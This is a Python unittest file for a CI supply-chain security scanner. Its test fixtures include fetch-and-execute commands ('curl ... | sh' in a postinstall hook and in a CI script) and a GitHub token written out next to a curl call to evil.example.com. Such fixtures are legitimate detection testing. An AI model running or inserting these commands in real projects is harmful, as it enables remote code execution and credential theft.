import argparse
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

import zt_slop  # noqa: E402


class Chdir:
    def __init__(self, path):
        self.path = path
        self.old = None

    def __enter__(self):
        self.old = os.getcwd()
        os.chdir(self.path)

    def __exit__(self, exc_type, exc, tb):
        os.chdir(self.old)


def run(cmd, cwd):
    subprocess.run(cmd, cwd=cwd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)


def make_diff(path, added_lines):
    """Build a minimal unified diff that adds `added_lines` to `path`."""
    header = (
        f"diff --git a/{path} b/{path}\n"
        f"index 0000000..1111111 100644\n"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        f"@@ -0,0 +1,{len(added_lines)} @@\n"
    )
    body = "".join(f"+{line}\n" for line in added_lines)
    return header + body


def ci_findings(path, added_lines, config=None):
    files = zt_slop.parse_diff(make_diff(path, added_lines))
    zt_slop.apply_suppressions(files)
    return zt_slop.scan_ci_supply_chain(files, config or zt_slop.DEFAULT_CONFIG)


class ZtSlopTests(unittest.TestCase):
    def test_redacts_known_tokens(self):
        text = "token='ghp_abcdefghijklmnopqrstuvwxyzABCDE12345'"
        redacted = zt_slop.redact(text)
        self.assertIn("REDACTED", redacted)
        self.assertNotIn("abcdefghijklmnopqrstuvwxyz", redacted)

    def test_lifecycle_script_blocks(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            run(["git", "init"], repo)
            run(["git", "config", "user.email", "test@example.com"], repo)
            run(["git", "config", "user.name", "Test"], repo)
            (repo / "package.json").write_text(json.dumps({"name": "demo", "version": "1.0.0"}) + "\n")
            run(["git", "add", "package.json"], repo)
            run(["git", "commit", "-m", "base"], repo)
            base = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=repo, text=True).strip()

            (repo / "package.json").write_text(
                json.dumps(
                    {
                        "name": "demo",
                        "version": "1.0.0",
                        "scripts": {"postinstall": "curl https://example.com/x | sh"},
                    },
                    indent=2,
                )
                + "\n"
            )
            run(["git", "add", "package.json"], repo)
            run(["git", "commit", "-m", "add postinstall"], repo)
            head = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=repo, text=True).strip()

            args = argparse.Namespace(
                base=base,
                head=head,
                config="missing.json",
                no_network=True,
                json_report="report.json",
                markdown_report="report.md",
                sarif_report="report.sarif",
                fail_on="block",
            )
            with Chdir(repo):
                findings, _elapsed = zt_slop.scan(args)
            self.assertTrue(any(f.rule_id == "package_json.lifecycle_script" and f.severity == "block" for f in findings))
            self.assertTrue(any(f.rule_id == "package_json.lifecycle_network_or_shell" and f.severity == "block" for f in findings))

    def test_workflow_pull_request_target_blocks(self):
        diff = """diff --git a/.github/workflows/release.yml b/.github/workflows/release.yml
index 0000000..1111111 100644
--- a/.github/workflows/release.yml
+++ b/.github/workflows/release.yml
@@ -0,0 +1,4 @@
+name: release
+on: pull_request_target
+permissions: write-all
+jobs: {}
"""
        files = zt_slop.parse_diff(diff)
        findings = []
        zt_slop.analyze_workflows(files, findings, zt_slop.DEFAULT_CONFIG)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("workflow.pull_request_target", rule_ids)
        self.assertIn("workflow.write_all_permissions", rule_ids)


class CiFileDetectionTests(unittest.TestCase):
    def test_matches_ci_and_release_paths(self):
        positives = [
            ".github/workflows/release.yml",
            ".github/workflows/scan.yaml",
            ".circleci/config.yml",
            ".circleci/config.yaml",
            ".gitlab-ci.yml",
            ".gitlab/ci/build.yml",
            "Jenkinsfile",
            "azure-pipelines.yml",
            "bitbucket-pipelines.yml",
            "buildkite.yaml",
            ".buildkite/pipeline.yml",
            "Taskfile.yml",
            "Makefile",
            "ci/security_scans.sh",
            "ci_cd/deploy.sh",
            "scripts/ci-build.sh",
            "scripts/release.sh",
            "scripts/publish-package.sh",
        ]
        for path in positives:
            self.assertTrue(zt_slop.is_ci_or_release_file(path), path)

    def test_rejects_non_ci_paths(self):
        negatives = ["src/app.py", "README.md", "docs/guide.md", "scripts/helper.sh", "config.yml"]
        for path in negatives:
            self.assertFalse(zt_slop.is_ci_or_release_file(path), path)

    def test_workflow_is_subset_of_ci(self):
        self.assertTrue(zt_slop.is_workflow(".github/workflows/x.yml"))
        self.assertTrue(zt_slop.is_ci_or_release_file(".github/workflows/x.yml"))

    def test_additional_ci_paths_from_config(self):
        config = json.loads(json.dumps(zt_slop.DEFAULT_CONFIG))
        config["ci_supply_chain"]["additional_ci_paths"] = ["deploy/*.sh"]
        self.assertTrue(zt_slop.is_ci_or_release_file("deploy/run.sh", config))
        self.assertFalse(zt_slop.is_ci_or_release_file("deploy/run.sh"))


class ExcludePathsTests(unittest.TestCase):
    def test_glob_and_prefix_matches(self):
        config = {"exclude_paths": ["zt_slop.py", "tests/", "vendor/*.js"]}
        self.assertTrue(zt_slop.is_excluded("zt_slop.py", config))
        self.assertTrue(zt_slop.is_excluded("tests/test_zt_slop.py", config))
        self.assertTrue(zt_slop.is_excluded("vendor/app.js", config))
        self.assertFalse(zt_slop.is_excluded("src/app.py", config))
        self.assertFalse(zt_slop.is_excluded("zt_slop_helper.py", config))

    def test_empty_or_missing_excludes_nothing(self):
        self.assertFalse(zt_slop.is_excluded("zt_slop.py", {}))
        self.assertFalse(zt_slop.is_excluded("zt_slop.py", {"exclude_paths": []}))


class SuppressionTests(unittest.TestCase):
    def test_single_line_marker_suppresses_finding(self):
        lines = [
            "      - run: docker run aquasec/trivy:latest fs .  # zt-slop:ignore",
        ]
        self.assertEqual(ci_findings(".github/workflows/scan.yml", lines), [])

    def test_region_markers_suppress_block(self):
        lines = [
            "      # zt-slop:ignore-start",
            "      - run: sudo apt-get install trivy",
            "      - run: docker run aquasec/trivy:latest fs .",
            "      # zt-slop:ignore-end",
        ]
        self.assertEqual(ci_findings(".circleci/config.yml", lines), [])

    def test_unmarked_lines_outside_region_still_scanned(self):
        lines = [
            "      # zt-slop:ignore-start",
            "      - run: docker run aquasec/trivy:latest fs .",
            "      # zt-slop:ignore-end",
            "      - run: sudo apt-get install trivy",
        ]
        findings = ci_findings(".circleci/config.yml", lines)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("ci.unpinned_high_impact_tool_install", rule_ids)
        self.assertNotIn("ci.floating_high_impact_tool_image", rule_ids)

    def test_suppression_breaks_exfil_cooccurrence(self):
        # A file with both a secret-source line and a network-sink line normally
        # triggers code.exfil_path; suppressing the network line removes it.
        diff = make_diff(
            "deploy.sh",
            [
                'echo "$GITHUB_TOKEN" > /tmp/t',
                "curl https://evil.example.com/x  # zt-slop:ignore",
            ],
        )
        files = zt_slop.parse_diff(diff)
        zt_slop.apply_suppressions(files)
        findings = []
        zt_slop.analyze_secrets_and_exfil(files, findings)
        self.assertFalse(any(f.rule_id == "code.exfil_path" for f in findings))


class CiSupplyChainPositiveTests(unittest.TestCase):
    def test_litellm_circleci_regression(self):
        findings = ci_findings(
            ".circleci/config.yml",
            [
                "      - run: wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -",  # zt-slop:ignore -- attack fixture, not a real command
                '      - run: echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list',
                "      - run: sudo apt-get install trivy",
            ],
        )
        self.assertTrue(any(f.severity == "block" for f in findings))
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("ci.downloaded_package_key_or_bootstrap", rule_ids)
        self.assertIn("ci.third_party_package_repo", rule_ids)
        self.assertIn("ci.unpinned_high_impact_tool_install", rule_ids)
        for f in findings:
            self.assertEqual(f.file, ".circleci/config.yml")
        blob = " ".join(f.evidence for f in findings)
        self.assertTrue("trivy" in blob or "aquasecurity.github.io" in blob)

    def test_gitlab_pip_install_twine(self):
        findings = ci_findings(
            ".gitlab-ci.yml",
            [
                "    - pip install twine",
                "    - twine upload dist/*",
            ],
        )
        tool_findings = [f for f in findings if f.rule_id == "ci.unpinned_high_impact_tool_install"]
        self.assertTrue(tool_findings)
        f = tool_findings[0]
        self.assertEqual(f.severity, "block")
        self.assertIn("Pin", f.recommendation)
        self.assertIn("version", f.recommendation.lower())

    def test_docker_run_latest_image(self):
        findings = ci_findings(
            ".github/workflows/scan.yml",
            ["      - run: docker run aquasec/trivy:latest fs ."],
        )
        block_floating = [
            f for f in findings if f.rule_id == "ci.floating_high_impact_tool_image" and f.severity == "block"
        ]
        self.assertTrue(block_floating)

    def test_high_impact_action_semver_tag(self):
        findings = ci_findings(
            ".github/workflows/release.yml",
            ["      - uses: aquasecurity/trivy-action@v0"],
        )
        block_action = [
            f for f in findings if f.rule_id == "ci.high_impact_action_not_sha_pinned" and f.severity == "block"
        ]
        self.assertTrue(block_action)

    def test_curl_pipe_shell_in_ci_script(self):
        findings = ci_findings(
            "ci/security_scans.sh",
            ["curl -sSfL https://example.com/install.sh | sh"],  # zt-slop:ignore -- attack fixture, not a real command
        )
        block_bootstrap = [
            f for f in findings if f.rule_id == "ci.downloaded_package_key_or_bootstrap" and f.severity == "block"
        ]
        self.assertTrue(block_bootstrap)


class CiSupplyChainNegativeTests(unittest.TestCase):
    def test_ordinary_apt_install_not_blocked(self):
        findings = ci_findings(
            ".circleci/config.yml",
            ["      - run: sudo apt-get install -y git jq unzip"],
        )
        self.assertEqual(findings, [])

    def test_pinned_pip_tool_not_blocked(self):
        findings = ci_findings(
            ".github/workflows/release.yml",
            ["      - run: python -m pip install twine==5.1.1"],
        )
        self.assertFalse(any(f.rule_id == "ci.unpinned_high_impact_tool_install" for f in findings))

    def test_digest_pinned_container_not_blocked(self):
        digest = "a" * 64
        findings = ci_findings(
            ".github/workflows/scan.yml",
            [f"      - run: docker run aquasec/trivy@sha256:{digest} fs ."],
        )
        self.assertFalse(any(f.rule_id == "ci.floating_high_impact_tool_image" for f in findings))

    def test_full_sha_pinned_action_not_blocked(self):
        findings = ci_findings(
            ".github/workflows/scan.yml",
            ["      - uses: aquasecurity/trivy-action@0123456789abcdef0123456789abcdef01234567"],
        )
        self.assertFalse(any(f.rule_id == "ci.high_impact_action_not_sha_pinned" for f in findings))

    def test_ordinary_dependency_installs_not_blocked(self):
        findings = ci_findings(
            ".github/workflows/ci.yml",
            [
                "      - run: npm ci",
                "      - run: pip install -r requirements.txt",
                "      - run: poetry install",
                "      - run: cargo build",
                "      - run: go mod download",
            ],
        )
        self.assertEqual(findings, [])


class CiSupplyChainEscalationTests(unittest.TestCase):
    def test_warn_escalates_to_block_with_publish_context(self):
        config = json.loads(json.dumps(zt_slop.DEFAULT_CONFIG))
        config["ci_supply_chain"]["block_unpinned_high_impact_tools"] = False
        findings = ci_findings(
            ".github/workflows/release.yml",
            [
                "      - run: pip install twine",
                "      - run: twine upload dist/*",
            ],
            config=config,
        )
        tool_findings = [f for f in findings if f.rule_id == "ci.unpinned_high_impact_tool_install"]
        self.assertTrue(tool_findings)
        f = tool_findings[0]
        self.assertEqual(f.severity, "block")
        self.assertIn("publish-capable or secret-bearing", f.recommendation)

    def test_allowed_repo_domain_downgrades_to_warn(self):
        config = json.loads(json.dumps(zt_slop.DEFAULT_CONFIG))
        config["ci_supply_chain"]["allowed_package_repo_domains"] = ["internal.example.com"]
        findings = ci_findings(
            "ci/setup.sh",
            ['echo "deb https://internal.example.com/repo stable main" | sudo tee -a /etc/apt/sources.list.d/x.list'],
            config=config,
        )
        repo_findings = [f for f in findings if f.rule_id == "ci.third_party_package_repo"]
        self.assertTrue(repo_findings)
        self.assertEqual(repo_findings[0].severity, "warn")

    def test_disabled_section_returns_no_findings(self):
        config = json.loads(json.dumps(zt_slop.DEFAULT_CONFIG))
        config["ci_supply_chain"]["enabled"] = False
        findings = ci_findings(".circleci/config.yml", ["      - run: sudo apt-get install trivy"], config=config)
        self.assertEqual(findings, [])


if __name__ == "__main__":
    unittest.main()
